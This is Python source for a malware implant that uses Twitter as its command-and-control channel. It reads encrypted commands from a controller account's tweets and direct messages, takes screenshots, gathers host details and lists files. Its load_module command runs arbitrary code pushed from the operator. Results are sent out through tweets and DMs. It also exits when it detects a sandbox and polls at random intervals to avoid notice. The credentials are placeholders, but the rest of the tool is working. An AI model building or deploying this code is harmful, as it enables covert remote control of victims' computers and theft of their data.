import tweepy
import base64
import json
import os
import time
import random
import socket
import platform
import uuid
from cryptography.fernet import Fernet
from io import BytesIO
from PIL import ImageGrab
import types
import threading
import logging

# Setup logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Client API credentials
API_KEY = "client_api_key"
API_SECRET = "client_api_secret"
ACCESS_TOKEN = "client_access_token"
ACCESS_TOKEN_SECRET = "client_access_token_secret"
BEARER_TOKEN = "client_bearer_token"

# Encryption
key = b"your_shared_key"  # Replace with server's key
cipher = Fernet(key)

# Twitter client
client = tweepy.Client(
    bearer_token=BEARER_TOKEN,
    consumer_key=API_KEY,
    consumer_secret=API_SECRET,
    access_token=ACCESS_TOKEN,
    access_token_secret=ACCESS_TOKEN_SECRET
)

CONTROLLER_ID = "controller_user_id"
CLIENT_ID = str(uuid.uuid4())
MEMORY_STORE = {}
MODULE_REGISTRY = {}

def encrypt_response(response):
    encrypted = base64.b64encode(cipher.encrypt(json.dumps(response).encode())).decode()
    logger.debug(f"Encrypted response: {response} -> {encrypted}")
    return encrypted

def decrypt_command(encrypted):
    decrypted = json.loads(cipher.decrypt(base64.b64decode(encrypted)).decode())
    logger.debug(f"Decrypted command: {encrypted} -> {decrypted}")
    return decrypted

def execute_command(payload):
    cmd = payload["cmd"]
    target = payload.get("target")
    if target and target != CLIENT_ID:
        logger.debug(f"Command ignored, not targeted: {cmd}")
        return None

    logger.info(f"Executing command: {cmd}")
    if cmd == "sysinfo":
        return {"os": platform.system(), "hostname": socket.gethostname(), "ip": socket.gethostbyname(socket.gethostname())}
    elif cmd == "whoami":
        return os.getlogin()
    elif cmd == "dir":
        result = os.popen("dir" if platform.system() == "Windows" else "ls").read()
        MEMORY_STORE["last_dir"] = result
        return result
    elif cmd == "screenshot":
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        screenshot_data = buffer.getvalue()
        buffer.close()
        MEMORY_STORE["last_screenshot"] = screenshot_data
        return screenshot_data
    elif cmd == "upload":
        fake_file = b"Simulated in-memory file content"
        MEMORY_STORE["last_upload"] = fake_file
        return fake_file
    elif cmd == "download":
        data = base64.b64decode(payload["data"])
        MEMORY_STORE["downloaded_file"] = data
        return "Data stored in memory"
    elif cmd == "get_memory":
        key = payload.get("key", "last_dir")
        return MEMORY_STORE.get(key, "No data in memory")
    elif cmd == "load_module":
        module_name = payload["module_name"]
        module_code = base64.b64decode(payload["module_code"]).decode()
        module_globals = {"exfiltrate": lambda data: exfiltrate_response(data), "MEMORY_STORE": MEMORY_STORE}
        try:
            exec(module_code, module_globals)
            MODULE_REGISTRY[module_name] = module_globals
            logger.info(f"Loaded module: {module_name}")
            return f"Module {module_name} loaded"
        except Exception as e:
            logger.error(f"Failed to load module {module_name}: {e}")
            return f"Module load failed: {e}"
    elif cmd in MODULE_REGISTRY:
        module = MODULE_REGISTRY.get(cmd.split("_")[0], {})
        func = module.get(cmd)
        if func and callable(func):
            try:
                return func(payload.get("args", {}))
            except Exception as e:
                logger.error(f"Module execution failed for {cmd}: {e}")
                return f"Module error: {e}"
        return f"Module command {cmd} not found"
    return "Unknown command"

def exfiltrate_response(data, tweet_id=None):
    if isinstance(data, bytes):
        data_encoded = base64.b64encode(data).decode()
    else:
        data_encoded = data
    
    response = {"client_id": CLIENT_ID, "data": data_encoded}
    encrypted = encrypt_response(response)
    
    if len(encrypted) > 10000:
        chunks = [encrypted[i:i+9000] for i in range(0, len(encrypted), 9000)]
        for i, chunk in enumerate(chunks):
            msg = f"RES:{i+1}/{len(chunks)}:{chunk}"
            try:
                if tweet_id:
                    client.create_tweet(text=msg, in_reply_to_tweet_id=tweet_id)
                    logger.info(f"Sent tweet chunk {i+1}/{len(chunks)} (Tweet ID: {tweet_id})")
                else:
                    client.create_direct_message(participant_id=CONTROLLER_ID, text=msg)
                    logger.info(f"Sent DM chunk {i+1}/{len(chunks)}")
            except Exception as e:
                logger.error(f"Exfiltration failed: {e}")
    else:
        msg = f"RES:{encrypted}"
        try:
            if tweet_id:
                client.create_tweet(text=msg, in_reply_to_tweet_id=tweet_id)
                logger.info(f"Sent tweet response (Tweet ID: {tweet_id})")
            else:
                client.create_direct_message(participant_id=CONTROLLER_ID, text=msg)
                logger.info("Sent DM response")
        except Exception as e:
            logger.error(f"Exfiltration failed: {e}")
    
    bio_data = f"ID:{CLIENT_ID[:8]}|Last:{int(time.time())}"
    try:
        client.update_profile(description=bio_data[:160])
        logger.debug(f"Updated bio: {bio_data}")
    except Exception as e:
        logger.error(f"Bio update failed: {e}")

def monitor_tweets():
    try:
        tweets = client.get_users_tweets(id=CONTROLLER_ID, max_results=10)
        for tweet in tweets.data:
            if tweet.text.startswith("CMD-"):
                encrypted = tweet.text.split(": ")[1]
                payload = decrypt_command(encrypted)
                result = execute_command(payload)
                if result:
                    exfiltrate_response(result, tweet.id)
    except Exception as e:
        logger.error(f"Tweet monitoring error: {e}")

def monitor_dms():
    try:
        dms = client.get_direct_messages()
        if dms.data:
            for dm in dms.data:
                if dm.sender_id == CONTROLLER_ID and dm.text.startswith("CMD:"):
                    encrypted = dm.text[4:]
                    payload = decrypt_command(encrypted)
                    result = execute_command(payload)
                    if result:
                        exfiltrate_response(result)
    except Exception as e:
        logger.error(f"DM monitoring error: {e}")

def anti_sandbox():
    checks = [
        "vmware" in platform.uname().release.lower(),
        os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys"),
        os.cpu_count() < 2
    ]
    detected = any(checks)
    logger.debug(f"Anti-sandbox result: {'Detected' if detected else 'Not detected'}")
    return detected

def main():
    if anti_sandbox():
        logger.info("Sandbox detected, exiting.")
        return
    
    try:
        client.create_direct_message(participant_id=CONTROLLER_ID, text=f"REGISTER: {CLIENT_ID}")
        logger.info(f"Registered with controller: {CLIENT_ID}")
    except Exception as e:
        logger.error(f"Registration failed: {e}")
    
    while True:
        try:
            monitor_tweets()
            monitor_dms()
            logger.debug("Polling cycle completed")
            time.sleep(random.randint(60, 600))
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            time.sleep(300)

if __name__ == "__main__":
    main()
